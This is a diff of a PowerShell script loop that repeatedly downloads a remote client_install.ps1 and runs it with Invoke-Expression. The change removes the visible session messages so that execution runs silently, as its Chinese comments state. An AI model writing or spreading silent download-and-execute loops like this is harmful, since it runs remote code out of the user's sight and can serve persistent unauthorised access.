@@ -22,22 +22,16 @@ while ($true) {{
     $sessionId = "session-{{0:000}}" -f $sessionCount
 
     try {{
-        Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Cyan
-        Write-Host "[$sessionId] Starting client session..." -ForegroundColor Cyan
-        Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Cyan
-
-        Write-Host "[$sessionId] Downloading and executing client script..." -ForegroundColor White
+        # 靜默執行客戶端腳本，不顯示 session 資訊
         $clientScript = Invoke-RestMethod -Uri "$serverUrl/client_install.ps1" -UseBasicParsing
         Invoke-Expression $clientScript
 
-        Write-Host "[$sessionId] Client session completed successfully" -ForegroundColor Green
-        Write-Host "[$sessionId] Will restart in 3 seconds..." -ForegroundColor Green
+        # 正常完成時也靜默，直接重啟
         Start-Sleep -Seconds 3
 
     }} catch {{
         $errorMsg = $_.Exception.Message
         Write-Host "[$sessionId] Session failed: $errorMsg" -ForegroundColor Red
-
         Write-Host "[$sessionId] Auto-healing: Retrying in 10 seconds..." -ForegroundColor Yellow
         Start-Sleep -Seconds 10
     }}
